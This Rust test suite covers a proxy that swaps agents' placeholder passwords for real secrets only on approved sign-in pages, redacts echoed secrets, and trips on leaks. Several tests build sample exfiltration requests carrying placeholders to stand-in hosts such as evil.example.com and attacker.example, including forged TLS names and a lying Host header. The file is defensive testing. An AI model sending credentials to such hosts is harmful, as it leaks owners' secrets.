//! Ported from test_logins.py, test_logins_review.py and test_logins_scope.py.

use base64::Engine;
use bytes::Bytes;
use serde_json::{Value, json};

use super::*;
use crate::flow::testing::request_flow;

struct Kit {
    dir: tempfile::TempDir,
    logins: Arc<Logins>,
}

fn kit(creds: Value) -> Kit {
    let dir = tempfile::tempdir().expect("dir");
    let p = dir.path().join("credentials.json");
    std::fs::write(&p, creds.to_string()).expect("creds");
    let logins = Logins::new(
        Arc::new(Creds::new(p)),
        Some("controlclaw.test".into()),
        dir.path().join("login-targets.json"),
    );
    Kit { dir, logins }
}

fn req(method: &str, url: &str, body: &str, headers: &[(&str, &str)]) -> Flow {
    let mut f = request_flow(method, url, b"");
    let mut b = http::Request::builder().method(method).uri(url);
    for (k, v) in headers {
        b = b.header(*k, *v);
    }
    f.request = b.body(Bytes::from(body.to_owned())).ok();
    f.vm_id = Some("a".into());
    f
}

fn form(host: &str, path: &str, body: &str) -> Flow {
    req(
        "POST",
        &format!("https://{host}{path}"),
        body,
        &[("content-type", "application/x-www-form-urlencoded")],
    )
}

fn json_post(host: &str, path: &str, body: Value) -> Flow {
    req(
        "POST",
        &format!("https://{host}{path}"),
        &body.to_string(),
        &[("content-type", "application/json")],
    )
}

fn applied(k: &Kit, f: &mut Flow) -> bool {
    k.logins.swap(f);
    f.meta
        .get(META_SWAPS)
        .and_then(Value::as_array)
        .is_some_and(|a| !a.is_empty())
}

fn body_of(f: &Flow) -> String {
    f.request
        .as_ref()
        .map(|r| String::from_utf8_lossy(r.body()).into_owned())
        .unwrap_or_default()
}

fn qs(s: &str) -> Vec<(String, String)> {
    crate::checks::body::parse_qsl(s)
}

const SECRET: &str = "Pa\"ss\\w&rd+ 100% \u{fc}!";
const PH: &str = "Kq7-xT2_mN9.vRw4bZ";

fn first() -> Kit {
    kit(json!([
        {"login_id": "lg_test0001", "login_name": "Example ops", "vm_id": "a", "placeholder": PH, "secret": SECRET,
         "allowed_hosts": ["login.example.com", "*.accounts.example.com"], "login_url": "https://login.example.com/session",
         "sign_in_paths": ["x.accounts.example.com/session"]},
        {"login_id": "lg_test0002", "login_name": "Door PIN", "vm_id": "a", "placeholder": "48213907", "secret": "11112222",
         "allowed_hosts": ["pin.example.com"], "login_url": "https://pin.example.com/session"},
        {"placeholder": "__LLM_KEY__", "secret": "sk-real", "vm_id": "a", "match_domain": "api.openai.com", "locations": ["header:authorization"]},
    ]))
}

#[test]
fn test_logins_swaps_scope_and_tripwire() {
    let k = first();
    // 1. A classic form: only the field that held the stand-in changes.
    let raw = format!("user=ops%40example.com&pass={PH}&keep=a%2Bb+c");
    let mut f = form("login.example.com", "/session", &raw);
    assert!(applied(&k, &mut f));
    let got = body_of(&f);
    assert_eq!(qs(&got)[1].1, SECRET);
    assert_eq!(got.split('&').next(), raw.split('&').next());
    assert_eq!(got.split('&').nth(2), raw.split('&').nth(2));
    assert_eq!(f.meta[META_SWAPS], json!(["Example ops"]));
    assert_eq!(
        (f.meta[META_IN].clone(), f.meta[META_SCOPE].clone()),
        (json!(["body"]), json!("page"))
    );
    // 2. JSON.
    let mut f = json_post(
        "login.example.com",
        "/session",
        json!({"username": "ops", "password": PH}),
    );
    assert!(applied(&k, &mut f));
    assert_eq!(
        serde_json::from_str::<Value>(&body_of(&f))
            .ok()
            .map(|v| v["password"].clone()),
        Some(json!(SECRET))
    );
    // 3. JSON inside a form field is Google's shape only.
    let inner = json!([1, 1, null, [1, null, null, null, [PH, null, true]]]).to_string();
    let outer = json!([[["B4hajb", inner, null, "generic"]]]).to_string();
    let mut f = form(
        "x.accounts.example.com",
        "/session",
        &format!("f.req={}&at=token", scope::quote_plus(&outer, "")),
    );
    assert!(!applied(&k, &mut f));
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("body"));
    // 4. Multipart is never a sign-in.
    let mp = format!("--b\r\nContent-Disposition: form-data; name=\"pass\"\r\n\r\n{PH}\r\n--b--\r\n");
    let mut f = req(
        "POST",
        "https://login.example.com/session",
        &mp,
        &[("content-type", "multipart/form-data; boundary=b")],
    );
    assert!(!applied(&k, &mut f) && body_of(&f).contains(PH));
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("body"));
    // 5. Never a query string.
    let mut f = req("GET", &format!("https://login.example.com/login?u=ops&p={PH}"), "", &[]);
    assert!(!applied(&k, &mut f));
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("place"));
    // 6. Never for another agent, another host, the apex of a wildcard, or a forged TLS name.
    for (host, vm) in [
        ("evil.example.com", Some("a")),
        ("login.example.com", Some("b")),
        ("login.example.com", None),
        ("accounts.example.com", Some("a")),
    ] {
        let mut w = form(host, "/session", &format!("pass={PH}"));
        w.vm_id = vm.map(str::to_owned);
        assert!(!applied(&k, &mut w) && body_of(&w).contains(PH), "{host} {vm:?}");
    }
    let mut w = form("login.example.com", "/session", &format!("pass={PH}"));
    w.sni = Some("evil.example.com".into());
    assert!(!applied(&k, &mut w));
    // 7. The tripwire.
    let hit = |f: &Flow| k.logins.tripwire(f).map(|c| str_of(&c, "login_id"));
    assert_eq!(
        hit(&form("evil.example.com", "/x", &format!("p={PH}"))).as_deref(),
        Some("lg_test0001")
    );
    assert!(hit(&req("POST", &format!("https://evil.example.com/x?q={PH}"), "", &[])).is_some());
    assert!(hit(&req("POST", "https://evil.example.com/x", "", &[("x-leak", PH)])).is_some());
    assert!(hit(&form("login.example.com", "/session", &format!("pass={PH}"))).is_none());
    assert!(hit(&form("evil.example.com", "/x", "nothing here")).is_none());
    // 7b. Not on the agent's own model provider.
    let llm = json_post(
        "api.openai.com",
        "/v1/chat/completions",
        json!({"messages": [{"role": "tool", "content": json!({"password_placeholder": PH}).to_string()}]}),
    );
    assert!(hit(&llm).is_none());
    let mut other = llm;
    other.vm_id = Some("b".into());
    assert!(
        hit(&other).is_some(),
        "another agent's integration hosts are not this one's"
    );
    // 7c. An all-digit stand-in counts only standing alone.
    assert!(hit(&form("evil.example.com", "/x", "ts=1748213907001")).is_none());
    assert_eq!(
        hit(&form("evil.example.com", "/x", "pin=48213907")).as_deref(),
        Some("lg_test0002")
    );
    let mut f = form("pin.example.com", "/session", "order=1748213907001&password=48213907");
    assert!(applied(&k, &mut f));
    assert_eq!(
        qs(&body_of(&f)),
        vec![
            ("order".into(), "1748213907001".into()),
            ("password".into(), "11112222".into())
        ]
    );
    // A lying Host: the URL names the login's site, the connection goes elsewhere.
    let mut lie =
        crate::flow::testing::lying_request_flow("POST", "attacker.example", "https://login.example.com/session", b"");
    lie.request = http::Request::builder()
        .method("POST")
        .uri("https://login.example.com/session")
        .header("content-type", "application/x-www-form-urlencoded")
        .body(Bytes::from(format!("pass={PH}")))
        .ok();
    lie.vm_id = Some("a".into());
    assert!(hit(&lie).is_some(), "the tripwire fires on the real destination");
    assert!(!applied(&k, &mut lie));
}

#[test]
fn echoes_are_taken_back_out() {
    let k = first();
    let mut f = form("login.example.com", "/session", &format!("pass={PH}"));
    assert!(applied(&k, &mut f));
    let echo = format!("You typed {SECRET} / {} / {}", scope::quote_plus(SECRET, ""), {
        let d = crate::checks::pyjson::dumps(&SECRET);
        d[1..d.len() - 1].to_owned()
    });
    let mut r = crate::checks::raw_response(200, echo.into_bytes(), "text/html");
    r.headers_mut().insert(
        "x-echo",
        http::HeaderValue::from_str(&scope::quote(SECRET)).expect("header"),
    );
    r.headers_mut()
        .append("set-cookie", http::HeaderValue::from_static("a=1"));
    r.headers_mut().append(
        "set-cookie",
        http::HeaderValue::from_str(&format!("b={}", scope::quote_plus(SECRET, ""))).expect("header"),
    );
    f.response = Some(r);
    k.logins.redact(&mut f);
    let r = f.response.as_ref().expect("response");
    let text = String::from_utf8_lossy(r.body()).into_owned();
    assert!(
        !text.contains(SECRET) && !text.contains(&scope::quote_plus(SECRET, "")) && text.contains(PH),
        "{text}"
    );
    assert_eq!(r.headers()["x-echo"], PH);
    let cookies: Vec<_> = r.headers().get_all("set-cookie").iter().collect();
    assert_eq!(cookies.len(), 2);
    assert_eq!(cookies[0], "a=1");
    // A later response from the login's sites to the same agent, within the window.
    let later = |host: &str, vm: &str, body: &str| {
        let mut g = req("GET", &format!("https://{host}/after"), "", &[]);
        g.vm_id = Some(vm.into());
        g.response = Some(crate::checks::raw_response(200, body.as_bytes().to_vec(), "text/html"));
        k.logins.redact(&mut g);
        g.response
            .map(|r| String::from_utf8_lossy(r.body()).into_owned())
            .unwrap_or_default()
    };
    assert!(!later("x.accounts.example.com", "a", &format!("Wrong password: {SECRET}")).contains(SECRET));
    assert!(
        later("x.accounts.example.com", "b", &format!("x {SECRET}")).contains(SECRET),
        "another agent's responses are left alone"
    );
    assert!(
        later("elsewhere.example.org", "a", &format!("x {SECRET}")).contains(SECRET),
        "only the login's sites"
    );
    // Bounded per agent.
    for _ in 0..48 {
        let mut f = form("login.example.com", "/session", &format!("pass={PH}"));
        applied(&k, &mut f);
    }
    assert!(
        k.logins
            .echoes
            .lock()
            .expect("lock")
            .iter()
            .map(|(_, e)| e.len())
            .sum::<usize>()
            <= LOGIN_ECHO_MAX
    );
    // The window closes.
    for (_, e) in k.logins.echoes.lock().expect("lock").iter_mut() {
        for x in e.iter_mut() {
            x.until = 0.0;
        }
    }
    assert!(later("x.accounts.example.com", "a", &format!("x {SECRET}")).contains(SECRET));
    // A body whose encoding does not undo is not passed on when a swap went out on it.
    let mut f = form("login.example.com", "/session", &format!("pass={PH}"));
    assert!(applied(&k, &mut f));
    let mut resp = crate::checks::raw_response(200, b"not gzip".to_vec(), "text/html");
    resp.headers_mut()
        .insert("content-encoding", http::HeaderValue::from_static("gzip"));
    f.response = Some(resp);
    k.logins.redact(&mut f);
    assert_eq!(f.response.map(|r| r.status().as_u16()), Some(502));
    // A later answer from the login's site that does not decode is passed on, as the addon does.
    let mut f = form("login.example.com", "/next", "q=1");
    let mut resp = crate::checks::raw_response(200, b"not gzip".to_vec(), "text/html");
    resp.headers_mut()
        .insert("content-encoding", http::HeaderValue::from_static("gzip"));
    f.response = Some(resp);
    k.logins.redact(&mut f);
    assert_eq!(f.response.map(|r| r.status().as_u16()), Some(200));
    // One that does is searched decoded, and sent back without the encoding.
    let mut f = form("login.example.com", "/session", &format!("pass={PH}"));
    assert!(applied(&k, &mut f));
    let mut resp = crate::checks::raw_response(200, gzip(&format!("echo {SECRET}")), "text/html");
    resp.headers_mut()
        .insert("content-encoding", http::HeaderValue::from_static("gzip"));
    f.response = Some(resp);
    k.logins.redact(&mut f);
    let r = f.response.expect("response");
    assert!(r.headers().get("content-encoding").is_none());
    assert_eq!(String::from_utf8_lossy(r.body()), format!("echo {PH}"));
}

#[test]
fn review_cases() {
    let secret = "Pa\"ss<\\w&rd>+ '\u{fc}";
    let k = kit(json!([
        {"login_id": "lg_test0001", "login_name": "Example ops", "vm_id": "a", "placeholder": PH, "secret": secret,
         "allowed_hosts": ["login.example.com", "*.accounts.example.com"], "login_url": "https://login.example.com/session"},
        {"login_id": "lg_test0002", "login_name": "Door PIN", "vm_id": "a", "placeholder": "4827", "secret": "9135", "allowed_hosts": ["pin.example.com"], "login_url": "https://pin.example.com/session"},
        {"login_id": "lg_test0003", "login_name": "Short", "vm_id": "a", "placeholder": "kQ4z", "secret": "hi&2", "allowed_hosts": ["short.example.com"], "login_url": "https://short.example.com/session"},
        {"placeholder": "__LLM_KEY__", "secret": "sk-real", "vm_id": "a", "match_domain": "api.openai.com", "locations": ["header:authorization"]},
        {"secret_name": "AWS", "placeholder": "CC-SEC-aws", "secret": "aws-real", "vm_id": "a", "allowed_hosts": ["*.amazonaws.com"]},
    ]));
    let basic = |u: &str, p: &str| {
        format!(
            "Basic {}",
            base64::engine::general_purpose::STANDARD.encode(format!("{u}:{p}"))
        )
    };
    let trip = |f: &Flow| k.logins.tripwire(f).map(|c| str_of(&c, "login_id"));
    // 1. Navigation headers are not an exfil attempt; credential-bearing ones are.
    for name in ["referer", "origin", "ping-from"] {
        let v = format!("https://login.example.com/login?user=ops&pass={PH}");
        assert!(
            trip(&req(
                "GET",
                "https://cdn.thirdparty.example/pixel.gif",
                "",
                &[(name, &v)]
            ))
            .is_none(),
            "{name}"
        );
    }
    for (name, value) in [
        ("authorization", format!("Bearer {PH}")),
        ("authorization", basic("ops", PH)),
        ("cookie", format!("s={PH}")),
        ("x-api-key", PH.to_owned()),
    ] {
        assert_eq!(
            trip(&req("GET", "https://evil.example.com/", "", &[(name, &value)])).as_deref(),
            Some("lg_test0001"),
            "{name}"
        );
    }
    // 2. On the login's own host only a form body.
    let f = req(
        "GET",
        "https://login.example.com/session",
        "",
        &[("authorization", &basic("ops@example.com", PH))],
    );
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("basic"));
    let f = req(
        "GET",
        "https://login.example.com/session",
        "",
        &[("authorization", &format!("Bearer {PH}")), ("x-password", PH)],
    );
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("place"));
    let f = req(
        "GET",
        &format!("https://login.example.com/api/users/ops/{PH}/token?u=ops&p={PH}"),
        "",
        &[],
    );
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("place"));
    let mut f = req(
        "POST",
        "https://login.example.com/session",
        &format!("pass={PH}"),
        &[
            ("content-type", "application/x-www-form-urlencoded"),
            ("x-password", PH),
        ],
    );
    assert!(
        !applied(&k, &mut f) && body_of(&f).contains(PH),
        "refused whole, not half swapped"
    );
    let referer = format!("https://login.example.com/?p={PH}");
    let mut f = req(
        "POST",
        "https://login.example.com/session",
        &format!("pass={PH}"),
        &[
            ("content-type", "application/x-www-form-urlencoded"),
            ("referer", &referer),
        ],
    );
    assert!(applied(&k, &mut f));
    assert!(
        f.request
            .as_ref()
            .is_some_and(|r| r.headers()["referer"].to_str().is_ok_and(|v| v.ends_with(PH)))
    );
    // 3. Short stand-ins: only standing alone.
    assert_eq!(
        trip(&form("evil.example.com", "/x", "pin=4827")).as_deref(),
        Some("lg_test0002")
    );
    let fq = format!("f.req={}", scope::quote_plus(&json!(["4827"]).to_string(), ""));
    assert_eq!(
        trip(&form("evil.example.com", "/x", &fq)).as_deref(),
        Some("lg_test0002")
    );
    for noise in ["id=148270", "v=4827.5", "v=1.4827", "ref=a4827", "k=xkQ4zy", "k=kQ4z-1"] {
        assert!(trip(&form("evil.example.com", "/x", noise)).is_none(), "{noise}");
    }
    assert_eq!(
        trip(&json_post("evil.example.com", "/x", json!({"p": "kQ4z"}))).as_deref(),
        Some("lg_test0003")
    );
    let mut f = form("pin.example.com", "/session", "order=148270&password=4827");
    assert!(applied(&k, &mut f));
    assert_eq!(
        qs(&body_of(&f)),
        vec![("order".into(), "148270".into()), ("password".into(), "9135".into())]
    );
    let mut f = json_post(
        "short.example.com",
        "/session",
        json!({"user": "kQ4zz", "pass": "kQ4z"}),
    );
    assert!(applied(&k, &mut f));
    assert_eq!(
        serde_json::from_str::<Value>(&body_of(&f)).ok(),
        Some(json!({"user": "kQ4zz", "pass": "hi&2"}))
    );
    // 4. XML and plain text are refused; the type is never guessed from the body.
    for (b, ct) in [
        (
            format!("<?xml version=\"1.0\"?><login user=\"ops\" pass=\"{PH}\"><pw>{PH}</pw></login>"),
            "text/xml; charset=utf-8",
        ),
        (format!("note \"{PH}\" end"), "text/plain"),
        (json!({"password": PH}).to_string(), "text/plain;charset=UTF-8"),
    ] {
        let f = req("POST", "https://login.example.com/session", &b, &[("content-type", ct)]);
        assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("body"), "{ct}");
    }
    let mut f = json_post("login.example.com", "/session", json!({"password": PH}));
    assert!(applied(&k, &mut f));
    assert_eq!(
        serde_json::from_str::<Value>(&body_of(&f))
            .ok()
            .map(|v| v["password"].clone()),
        Some(json!(secret))
    );
    // 7. A custom secret's broad pattern does not switch the tripwire off; the model provider does.
    assert!(trip(&form("s3.eu-west-1.amazonaws.com", "/x", &format!("x={PH}"))).is_some());
    assert!(trip(&json_post("api.openai.com", "/v1/x", json!({"c": PH}))).is_none());
}

fn ph(n: u32) -> String {
    format!("{PH}{n:02}")
}

fn scope_kit() -> Kit {
    let login = |n: u32, extra: Value| {
        let mut l = json!({"login_id": format!("lg_test00{n:02}"), "login_name": format!("L{n}"), "vm_id": "a", "placeholder": ph(n), "secret": "S3cret-Pass w&rd"});
        if let (Some(l), Some(e)) = (l.as_object_mut(), extra.as_object()) {
            l.extend(e.clone());
        }
        l
    };
    kit(json!([
        login(
            1,
            json!({"allowed_hosts": ["github.example", "*.github.example"], "login_url": "https://github.example/login"})
        ),
        login(
            2,
            json!({"allowed_hosts": ["wp.example"], "login_url": "https://wp.example/blog/wp-login.php"})
        ),
        login(
            3,
            json!({"allowed_hosts": ["app.example", "api.example", "*.cdn.example"], "login_url": "https://app.example/login",
            "sign_in_paths": ["/oauth/token", "api.example/v1/auth/*", "api.example/v2/auth/", "/", "/*", "api.example/", "api.example/*", "evil.example/x", "/index.php?route=account/login", "/a/../b", "/semi;x", "/star*/x", "/graphql"]})
        ),
        login(4, json!({"allowed_hosts": ["basic.example"], "login_auth": "basic"})),
        login(5, json!({"allowed_hosts": ["plain.example"]})),
        login(6, json!({"allowed_hosts": ["accounts.google.com", "*.google.com"]})),
        login(
            7,
            json!({"allowed_hosts": ["kept.example"], "login_url": "https://kept.example/login", "sign_in_targets": ["https://kept.example/sessions"],
            "pending_targets": ["https://kept.example/waiting"], "refused_targets": ["https://kept.example/comments"], "expired_targets": ["https://kept.example/old"]})
        ),
        login(
            9,
            json!({"allowed_hosts": ["wiki.example"], "login_url": "https://wiki.example/w/index.php?title=Special:UserLogin"})
        ),
        login(
            16,
            json!({"allowed_hosts": ["http.example"], "login_url": "http://http.example/login"})
        ),
    ]))
}

fn sflow(n: u32, url: &str, method: &str, body: Option<&str>, headers: &[(&str, &str)]) -> Flow {
    let b = body.map_or_else(|| format!("user=ops&password={}", ph(n)), str::to_owned);
    let mut h = vec![("content-type", "application/x-www-form-urlencoded")];
    h.extend_from_slice(headers);
    req(method, url, &b, &h)
}

#[test]
fn where_a_password_may_go() {
    let k = scope_kit();
    let swapped = |mut f: Flow| applied(&k, &mut f) && body_of(&f).contains("S3cret-Pass+w%26rd");
    let refused = |f: Flow, why: &str| {
        let got = k.logins.out_of_scope(&f).map(|x| x.1);
        let mut f = f;
        got == Some(why) && !applied(&k, &mut f)
    };
    let post = |n: u32, url: &str| sflow(n, url, "POST", None, &[]);
    assert!(refused(post(5, "https://plain.example/login"), "no_page"));
    assert!(
        refused(post(16, "https://http.example/login"), "no_page"),
        "a plain http page is no sign-in page"
    );
    assert!(refused(post(1, "http://github.example/login"), "http"));
    assert!(
        swapped(post(1, "https://github.example/login"))
            && swapped(sflow(1, "https://github.example/login", "PUT", None, &[]))
    );
    for m in ["GET", "PATCH", "DELETE"] {
        assert!(
            refused(sflow(1, "https://github.example/login", m, None, &[]), "place"),
            "{m}"
        );
    }
    assert!(refused(
        sflow(
            1,
            &format!("https://github.example/login?p={}", ph(1)),
            "POST",
            Some(""),
            &[]
        ),
        "place"
    ));
    assert!(
        refused(post(1, "https://github.example/session"), "page"),
        "not learned, not approved"
    );
    assert!(refused(post(1, "https://gist.github.example/login"), "page"));
    assert!(
        refused(post(1, "https://github.example:8443/login"), "page"),
        "nor another port"
    );
    assert!(swapped(post(2, "https://wp.example/blog/wp-login.php")));
    for q in ["?action=register", "?x", "?&", "?=", "?%00"] {
        assert!(
            refused(post(2, &format!("https://wp.example/blog/wp-login.php{q}")), "page"),
            "{q}"
        );
    }
    for other in [
        "/blog/wp-comments-post.php",
        "/blog/",
        "/blog/wp-login.php/x",
        "/blog/wp-login.php;x=1",
    ] {
        assert!(
            refused(post(2, &format!("https://wp.example{other}")), "page"),
            "{other}"
        );
    }
    // A page routed by its query.
    let w = "https://wiki.example/w/index.php?title=Special:UserLogin";
    let wiki = |url: &str, body: Option<String>| {
        sflow(
            9,
            url,
            "POST",
            Some(&body.unwrap_or_else(|| format!("wpName=ops&wpPassword={}", ph(9)))),
            &[],
        )
    };
    assert!(
        swapped(wiki(w, None)) && swapped(wiki("https://wiki.example/w/index.php?title=Special%3AUserLogin", None))
    );
    for other in [
        "https://wiki.example/w/index.php?title=Sandbox&action=submit",
        "https://wiki.example/w/index.php",
        &format!("{w}&returnto=Main"),
        &format!("{w}&Title=Sandbox"),
    ] {
        assert!(refused(wiki(other, None), "page"), "{other}");
    }
    assert!(refused(
        wiki(w, Some(format!("title=Sandbox&action=submit&wpPassword={}", ph(9)))),
        "page"
    ));
    assert!(swapped(wiki(
        w,
        Some(format!("title=Special%3AUserLogin&wpName=ops&wpPassword={}", ph(9)))
    )));
    assert!(refused(
        wiki(w, Some(format!("title%00=Sandbox&wpPassword={}", ph(9)))),
        "body"
    ));
    // Owner-set addresses.
    let mut f = req(
        "POST",
        "https://api.example/v1/auth/login",
        &json!({"password": ph(3)}).to_string(),
        &[("content-type", "application/json")],
    );
    assert!(applied(&k, &mut f));
    assert!(swapped(post(3, "https://app.example/oauth/token")));
    assert!(refused(post(3, "https://app.example/oauth/token/x"), "page"));
    assert!(
        refused(post(3, "https://api.example/oauth/token"), "page"),
        "a bare path is the sign-in page's host only"
    );
    assert!(
        refused(post(3, "https://api.example/v1/notes"), "page"),
        "'/*' and 'api.example/*' are not taken"
    );
    assert!(
        swapped(post(3, "https://api.example/v2/auth/"))
            && refused(post(3, "https://api.example/v2/auth/login"), "page")
    );
    assert!(swapped(post(3, "https://api.example/v1/auth/a/b")));
    assert!(swapped(post(3, "https://app.example/index.php?route=account/login")));
    assert!(refused(post(3, "https://app.example/"), "page"));
    assert!(refused(
        sflow(
            3,
            "https://app.example/oauth/token",
            "POST",
            Some(&format!("comment={}", ph(3))),
            &[]
        ),
        "field"
    ));
    let gql = json!({"query": ph(3)}).to_string();
    assert!(refused(
        req(
            "POST",
            "https://app.example/graphql",
            &gql,
            &[("content-type", "application/json")]
        ),
        "field"
    ));
    // Approved, pending, expired.
    assert!(swapped(post(7, "https://kept.example/sessions")));
    assert!(refused(post(7, "https://kept.example/waiting"), "pending"));
    assert!(refused(post(7, "https://kept.example/old"), "expired"));
    assert!(refused(post(7, "https://kept.example/comments"), "page"));
    // Google's known path: its own shape only.
    assert!(refused(
        post(
            6,
            "https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=x"
        ),
        "body"
    ));
    assert!(refused(
        post(6, "https://accounts.google.com/o/oauth2/anything"),
        "no_page"
    ));
    // HTTP Basic: that header, and nothing else.
    let b = format!(
        "Basic {}",
        base64::engine::general_purpose::STANDARD.encode(format!("ops:{}", ph(4)))
    );
    let mut f = req("GET", "https://basic.example/any/path", "", &[("authorization", &b)]);
    assert!(applied(&k, &mut f));
    let auth = f
        .request
        .as_ref()
        .map(|r| r.headers()["authorization"].to_str().unwrap_or("").to_owned())
        .unwrap_or_default();
    assert_eq!(
        base64::engine::general_purpose::STANDARD.decode(&auth[6..]).ok(),
        Some(b"ops:S3cret-Pass w&rd".to_vec())
    );
    assert_eq!(f.meta[META_SCOPE], "basic");
    assert!(refused(post(4, "https://basic.example/form"), "header"));
    // Method overrides.
    assert!(refused(
        sflow(
            1,
            "https://github.example/login",
            "POST",
            None,
            &[("x-http-method-override", "DELETE")]
        ),
        "method"
    ));
    assert!(refused(
        sflow(
            1,
            "https://github.example/login",
            "POST",
            Some(&format!("_method=put&password={}", ph(1))),
            &[]
        ),
        "method"
    ));
}

#[test]
fn google_sign_in_shape() {
    let k = scope_kit();
    let p = ph(6);
    let payload = json!([1, 1, null, [1, null, null, null, [p, null, 1]], null]).to_string();
    let freq = json!([[["B4hajb", payload, null, "generic"]]]).to_string();
    let body = format!("f.req={}&at=tok&", scope::quote_plus(&freq, ""));
    let mut f = req(
        "POST",
        "https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb",
        &body,
        &[("content-type", "application/x-www-form-urlencoded;charset=UTF-8")],
    );
    assert!(applied(&k, &mut f));
    assert!(body_of(&f).contains("S3cret-Pass"));
    // The stand-in anywhere else in it: refused.
    let payload = json!([1, 1, null, [1, null, null, null, [p, null, 1]], p]).to_string();
    let freq = json!([[["B4hajb", payload, null, "generic"]]]).to_string();
    let f = req(
        "POST",
        "https://accounts.google.com/v3/signin/x",
        &format!("f.req={}", scope::quote_plus(&freq, "")),
        &[("content-type", "application/x-www-form-urlencoded")],
    );
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("body"));
}

#[test]
fn learning_form_targets() {
    let k = scope_kit();
    let page = |url: &str, html: &str, sni: Option<&str>| {
        let mut f = req("GET", url, "", &[]);
        f.sni = sni.map(str::to_owned);
        f.response = Some(crate::checks::raw_response(
            200,
            html.as_bytes().to_vec(),
            "text/html; charset=utf-8",
        ));
        forms::learn(&k.logins, &f);
    };
    let learned = || -> Vec<String> {
        std::fs::read_to_string(k.dir.path().join("login-targets.json"))
            .ok()
            .and_then(|t| serde_json::from_str::<Value>(&t).ok())
            .and_then(|v| {
                v.get("lg_test0001")
                    .and_then(|e| e.get("targets"))
                    .and_then(Value::as_object)
                    .map(|o| o.keys().cloned().collect())
            })
            .unwrap_or_default()
    };
    let html =
        r#"<form action="/session" method="post"><input name="login"><input type="password" name="password"></form>"#;
    page("https://github.example/login", html, Some("evil.example"));
    assert!(
        learned().is_empty(),
        "no lesson from a page whose TLS name is not the site"
    );
    page("https://github.example/other", html, Some("github.example"));
    assert!(learned().is_empty(), "only the sign-in page teaches");
    page("https://github.example/login", html, Some("github.example"));
    assert_eq!(learned(), vec!["https://github.example/session".to_owned()]);
    // Pending until the owner approves it.
    let f = sflow(1, "https://github.example/session", "POST", None, &[]);
    assert_eq!(k.logins.out_of_scope(&f).map(|x| x.1), Some("pending"));
    let cross = r#"<form action="https://evil.example/steal" method="post"><input name="login"><input type="password" name="password"></form>"#;
    page("https://github.example/login", cross, Some("github.example"));
    assert_eq!(
        learned(),
        vec!["https://github.example/session".to_owned()],
        "a target off the login's sites is not taught"
    );
}

#[test]
fn review_fixes() {
    let k = first();
    // A swap goes only to a checked destination, and over TLS only with that name.
    let mut f = form("login.example.com", "/session", &format!("pass={PH}"));
    f.sni = None;
    assert!(!applied(&k, &mut f), "no TLS name");
    // The swapped body carries no transfer or content encoding.
    let mut f = req(
        "POST",
        "https://login.example.com/session",
        &format!("pass={PH}"),
        &[
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ],
    );
    assert!(applied(&k, &mut f));
    let r = f.request.as_ref().expect("request");
    assert!(r.headers().get("transfer-encoding").is_none());
    assert_eq!(
        r.headers()["content-length"].to_str().ok().map(str::to_owned),
        Some(r.body().len().to_string())
    );
}

fn gzip(text: &str) -> Vec<u8> {
    use std::io::Write;
    let mut z = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    z.write_all(text.as_bytes()).expect("gzip");
    z.finish().expect("gzip")
}

fn encoded(f: &mut Flow, encoding: &'static str, body: Vec<u8>) {
    if let Some(r) = f.request.as_mut() {
        r.headers_mut()
            .insert("content-encoding", http::HeaderValue::from_static(encoding));
        *r.body_mut() = Bytes::from(body);
    }
}

#[tokio::test]
async fn an_undecodable_body_with_logins_is_refused() {
    let k = first();
    let gate = LoginGate(k.logins.clone());
    // An encoding that cannot be undone: refused as a check that could not run.
    let mut f = form("evil.example.com", "/x", "");
    encoded(&mut f, "compress", b"bytes".to_vec());
    let Verdict::Answer(r) = gate.run(Hook::Request, &mut f).await else {
        panic!("refused")
    };
    assert_eq!(r.status(), 403);
    assert_eq!(f.meta[crate::checks::META_RECORD]["login_why"], "error");
    // A gzipped body is read decoded: the stand-in in it to another site trips the wire.
    let mut f = form("evil.example.com", "/x", "");
    encoded(&mut f, "gzip", gzip(&format!("pass={PH}")));
    let Verdict::Answer(r) = gate.run(Hook::Request, &mut f).await else {
        panic!("tripwire")
    };
    assert_eq!(r.status(), 403);
    assert!(f.meta[crate::checks::META_RECORD].get("login_why").is_none());
    // A plain body with no stand-in passes: nothing waits on a flag from the plumbing.
    let mut f = form("evil.example.com", "/x", "q=hello");
    assert!(matches!(gate.run(Hook::Request, &mut f).await, Verdict::Continue));
}

#[test]
fn an_escaped_holder_cannot_send_the_password_elsewhere() {
    let k = first();
    // The holder spelled with an escape, the stand-in written plainly as a number in another field:
    // the PIN would go into `note`.
    let raw = r#"{"password":"\u00348213907","note":48213907}"#;
    let mut f = req(
        "POST",
        "https://pin.example.com/session",
        raw,
        &[("content-type", "application/json")],
    );
    assert!(!applied(&k, &mut f));
    assert_eq!(body_of(&f), raw);
    // The escaped holder alone: the stand-in is not written plainly anywhere, nothing goes in.
    let raw = r#"{"password":"\u00348213907","note":"x"}"#;
    let mut f = req(
        "POST",
        "https://pin.example.com/session",
        raw,
        &[("content-type", "application/json")],
    );
    assert!(!applied(&k, &mut f));
    // In a string with an escaped quote before it: not a whole value.
    let raw = r#"{"password":"x","note":"a\"48213907\""}"#;
    let mut f = req(
        "POST",
        "https://pin.example.com/session",
        raw,
        &[("content-type", "application/json")],
    );
    assert!(!applied(&k, &mut f));
    // The plain sign-in still works, and its record names the login.
    let mut f = json_post(
        "pin.example.com",
        "/session",
        json!({"user": "ops", "password": "48213907"}),
    );
    assert!(applied(&k, &mut f));
    assert_eq!(body_of(&f), r#"{"user":"ops","password":"11112222"}"#);
    assert_eq!(f.meta["login_placeholders"], json!(["48213907"]));
    assert_eq!(
        f.meta["login_record"],
        json!({"login": "Door PIN", "login_in": ["body"], "login_scope": "page"})
    );
}

/// main #617: Google's sign-in is swapped by its structure. The one match in the text is the tail
/// of a `\u5519` escape in another payload string; the password lands at `payload[3][4][0]` only,
/// and everything else in the form stays as sent.
#[test]
